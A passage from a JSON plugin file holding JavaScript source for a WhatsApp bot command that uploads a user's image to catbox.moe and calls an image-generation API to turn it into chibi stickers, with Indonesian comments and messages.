      "code": "/* CODE LAIN CHEK\nhttps://whatsapp.com/channel/0029VbARSvBCMY0PDV53rt0m\nJANGAN LUPA FOLLOW\n*/\n\n// CREATE BY REZA DEVS KUROMI\nconst fetch = require(\\\"node-fetch\\\");\nconst FormData = require(\\\"form-data\\\");\nconst { fromBuffer } = require(\\\"file-type\\\");\nconst axios = require(\\\"axios\\\");\n\nexports.run = {\n    usage: [\\\"tochibi\\\", \\\"stickerchibi\\\"],\n    hidden: [\\\"tcibi\\\"],\n    use: \\\"reply / kirim gambar\\\",\n    category: \\\"ai\\\",\n\n    async: async (m, { kuromi, quoted }) => {\n        try {\n            if (!quoted || !/image/.test(quoted.mime))\n                return m.reply(\\\"Reply gambar atau kirim gambar dengan command.\\\");\n\n            kuromi.sendReact(m.chat, \\\"üïí\\\", m.key);\n\n            // ===============================\n            // DOWNLOAD IMAGE\n            // ===============================\n            let buffer = await quoted.download();\n            if (!buffer) throw \\\"Gagal download gambar.\\\";\n\n            let type = await fromBuffer(buffer);\n            let ext = type?.ext || \\\"jpg\\\";\n\n            // ===============================\n            // UPLOAD KE CATBOX\n            // ===============================\n            let form = new FormData();\n            form.append(\\\"fileToUpload\\\", buffer, \\\"file.\\\" + ext);\n            form.append(\\\"reqtype\\\", \\\"fileupload\\\");\n\n            let imageUrl = await (\n                await fetch(\\\"https://catbox.moe/user/api.php\\\", {\n                    method: \\\"POST\\\",\n                    body: form\n                })\n            ).text();\n\n            if (!/^https?:\\/\\//.test(imageUrl))\n                throw \\\"Gagal upload ke catbox.\\\";\n\n            // ===============================\n            // PROMPT CHIBI (FIXED)\n            // ===============================\n            const prompt =\n                \\\"Turn this image into a set of 1 chibi sticker (in a 4x4 grid) \\\" +\n                \\\"with clothing similar to the one in this image. \\\" +\n                \\\"Include expressions: laughing, angry, crying, pouting, thinking, sleepy, \\\" +\n                \\\"blowing a kiss, winking, and surprised\\\";\n\n            // ===============================\n            // CALL API NEKOLABS\n            // ===============================\n            let { data } = await axios.get(\n                \\\"https://api.nekolabs.web.id/img.gen/nano-banana/v3\\\",\n                {\n                    params: {\n                        prompt,\n                        imageUrl\n                        // X-NekoKey / vpn_key bisa ditambahkan di sini\n                    },\n                    timeout: 180000\n                }\n            );\n\n            if (!data || !data.success || !data.result)\n                throw \\\"API gagal memproses gambar.\\\";\n\n            // ===============================\n            // SEND RESULT\n            // ===============================\n            await kuromi.sendMessage(\n                m.chat,\n                {\n                    image: { url: data.result },\n                    caption: `NIH UDAH JADI CHIBI`\n                      \n                },\n                { quoted: m }\n            );\n\n            kuromi.sendReact(m.chat, \\\"‚úÖ\\\", m.key);\n\n        } catch (e) {\n            console.error(e);\n            kuromi.sendReact(m.chat, \\\"‚ùå\\\", m.key);\n            m.reply(\\\"‚ùå Gagal membuat chibi .\\\" + e.message );\n        }\n    },\n\n    location: \\\"plugins/ai/tochibi.js\\\"\n};",
      "time": "2025-12-22 23:41:24"
    }
  ],
  "remove": [],
  "version": "1.18"
}